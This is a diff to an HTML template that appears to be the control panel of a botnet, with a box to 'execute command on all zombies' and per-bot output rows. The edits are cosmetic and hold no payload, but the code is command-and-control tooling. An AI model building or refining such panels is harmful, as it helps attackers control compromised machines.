@@ -10,7 +10,7 @@
     <div class="header">
         <div class="execute-all">
           <input type="text" id="execute-all-input" placeholder="Execute command on all zombies">
-          <button class="execute-btn">Execute</button>
+          <button id="execute-all-btn" class="execute-btn">Execute</button>
         </div>
         <div class="user-actions">
             <span class="welcome-text">Welcome {{ current_user.username }}</span>
@@ -59,7 +59,9 @@
             <tr class="output-row" id="output-row-{{ bot['thread_uuid'] }}" style="display: none;">
                 <td colspan="8">
                     <div class="output-field" id="output-field-{{ bot['thread_uuid'] }}">
-                        {{ bot['last_output'] }}
+                        <pre>
+                            {{ bot['last_output'] }}
+                        </pre>
                     </div>
                 </td>
             </tr>              
